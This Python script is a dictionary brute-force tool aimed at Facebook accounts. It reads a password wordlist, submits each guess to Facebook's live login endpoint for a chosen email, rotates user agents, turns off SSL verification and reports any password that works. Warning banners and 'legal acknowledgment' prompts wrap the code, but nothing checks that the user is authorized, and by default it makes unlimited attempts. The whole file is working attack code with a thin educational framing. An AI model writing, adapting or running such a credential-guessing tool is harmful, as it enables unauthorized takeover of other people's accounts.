#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
Educational/Authorized Facebook Login Tester
WARNING: Only use on accounts you own or have explicit written permission to test.
"""

import sys
import time
import random
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
from typing import Optional, List
import argparse

# Disable SSL warnings for demo (not recommended for production)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class FacebookLoginTester:
    """Educational tool for testing login security with permission"""
    
    def __init__(self, user_agent: Optional[str] = None):
        self.session = requests.Session()
        self.setup_session(user_agent)
        
    def setup_session(self, user_agent: Optional[str] = None):
        """Configure HTTP session with retry logic"""
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)
        
        # Set headers
        self.session.headers.update({
            'User-Agent': user_agent or self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Disable automatic redirects to handle them manually
        self.session.max_redirects = 1
        
    @staticmethod
    def get_random_user_agent() -> str:
        """Return a random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        ]
        return random.choice(user_agents)
    
    def get_login_page(self) -> Optional[str]:
        """Fetch the Facebook login page to get necessary tokens"""
        try:
            url = "https://www.facebook.com/login.php"
            response = self.session.get(url, timeout=10, verify=False)
            response.raise_for_status()
            return response.text
        except requests.RequestException as e:
            logger.error(f"Failed to get login page: {e}")
            return None
    
    def extract_login_params(self, page_content: str) -> dict:
        """Extract necessary parameters from login page (simplified)"""
        # In a real implementation, you would parse the HTML for fb_dtsg, lsd, etc.
        # This is a simplified version
        params = {
            'email': '',
            'pass': '',
            'login': 'Log In',
            'timezone': '-480',
        }
        return params
    
    def attempt_login(self, email: str, password: str, delay: float = 1.0) -> bool:
        """Attempt to login with given credentials"""
        try:
            time.sleep(delay)  # Rate limiting
            
            # Prepare login data
            login_data = {
                'email': email,
                'pass': password,
                'login': 'Log In',
                'timezone': '-480',
                'lgndim': '',
                'lgnrnd': '',
                'lgnjs': int(time.time()),
                'locale': 'en_US',
            }
            
            # Try login
            login_url = "https://www.facebook.com/login.php?login_attempt=1"
            response = self.session.post(
                login_url,
                data=login_data,
                allow_redirects=True,
                timeout=15,
                verify=False
            )
            
            # Check for successful login indicators
            # Note: Facebook's actual response checking is more complex
            if "login_error" in response.url or "checkpoint" in response.url:
                return False
                
            # Check for redirect to home page
            if "facebook.com/home" in response.url or "facebook.com/?sk=welcome" in response.url:
                return True
                
            # Check for welcome message in content
            if "Welcome to Facebook" in response.text or "news feed" in response.text.lower():
                return True
                
            return False
            
        except requests.RequestException as e:
            logger.error(f"Login attempt failed: {e}")
            return False
    
    def test_credentials(self, email: str, password_list_path: str, 
                        delay: float = 1.0, max_attempts: int = 10) -> Optional[str]:
        """Test credentials from a list with rate limiting"""
        try:
            with open(password_list_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"Password file not found: {password_list_path}")
            return None
        except Exception as e:
            logger.error(f"Error reading password file: {e}")
            return None
        
        logger.info(f"Loaded {len(passwords)} passwords to test")
        logger.info(f"Rate limiting: {delay} second(s) between attempts")
        logger.info(f"Testing account: {email}")
        
        attempts = 0
        for password in passwords:
            attempts += 1
            if max_attempts and attempts > max_attempts:
                logger.warning(f"Maximum attempts ({max_attempts}) reached. Stopping.")
                break
                
            logger.info(f"Attempt {attempts}/{len(passwords)}: Trying '{password}'")
            
            if self.attempt_login(email, password, delay):
                logger.info(f"SUCCESS! Valid credentials found:")
                logger.info(f"  Email: {email}")
                logger.info(f"  Password: {password}")
                return password
            
            # Update progress
            sys.stdout.write(f"\rProgress: {attempts}/{len(passwords)}")
            sys.stdout.flush()
        
        print()  # New line after progress
        logger.info("No valid password found in the list")
        return None

def display_banner():
    """Display tool banner with warnings"""
    banner = """
    +===============================================+
    |     EDUCATIONAL FACEBOOK LOGIN TESTER         |
    +===============================================+
    | WARNING: For authorized testing only!         |
    |                                               |
    | Legal Use Cases:                              |
    | - Testing your own accounts                   |
    | - Authorized penetration testing              |
    | - Educational purposes                        |
    |                                               |
    | Illegal Use:                                  |
    | - Unauthorized access to others' accounts     |
    | - Brute force attacks without permission      |
    +===============================================+
    """
    print(banner)

def get_user_confirmation():
    """Get explicit user confirmation for legal use"""
    print("\n" + "="*60)
    print("LEGAL ACKNOWLEDGMENT REQUIRED")
    print("="*60)
    print("By continuing, you confirm that:")
    print("1. You own the account being tested OR")
    print("2. You have explicit written permission to test the account")
    print("3. You understand unauthorized access is illegal")
    print("="*60)
    
    response = input("\nDo you confirm these conditions? (yes/no): ").strip().lower()
    return response == 'yes'

def main():
    """Main function"""
    display_banner()
    
    if not get_user_confirmation():
        logger.info("Exiting. Only use this tool with proper authorization.")
        sys.exit(0)
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Educational Facebook Login Tester')
    parser.add_argument('-e', '--email', help='Facebook email/username')
    parser.add_argument('-w', '--wordlist', help='Path to password wordlist')
    parser.add_argument('-d', '--delay', type=float, default=2.0,
                       help='Delay between attempts (seconds)')
    parser.add_argument('-m', '--max-attempts', type=int, default=0,
                       help='Maximum number of attempts (0 for unlimited)')
    
    args = parser.parse_args()
    
    # Get credentials if not provided via command line
    email = args.email or input("Enter Facebook email/username: ").strip()
    wordlist = args.wordlist or input("Enter wordlist path: ").strip()
    
    if not email or not wordlist:
        logger.error("Email and wordlist path are required!")
        sys.exit(1)
    
    # Create tester and run
    tester = FacebookLoginTester()
    
    # Additional safety check
    print(f"\nYou are about to test: {email}")
    print(f"Using wordlist: {wordlist}")
    final_confirmation = input("Type 'CONFIRM' to proceed: ").strip()
    
    if final_confirmation != 'CONFIRM':
        logger.info("Operation cancelled by user.")
        sys.exit(0)
    
    # Start testing
    print("\n" + "="*60)
    print("Starting authorized testing...")
    print("="*60 + "\n")
    
    start_time = time.time()
    result = tester.test_credentials(
        email=email,
        password_list_path=wordlist,
        delay=args.delay,
        max_attempts=args.max_attempts
    )
    
    elapsed = time.time() - start_time
    
    print("\n" + "="*60)
    if result:
        print(f"TEST COMPLETE - Valid password found!")
        print(f"Time elapsed: {elapsed:.2f} seconds")
    else:
        print(f"TEST COMPLETE - No valid password found")
        print(f"Time elapsed: {elapsed:.2f} seconds")
    print("="*60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nOperation interrupted by user.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)
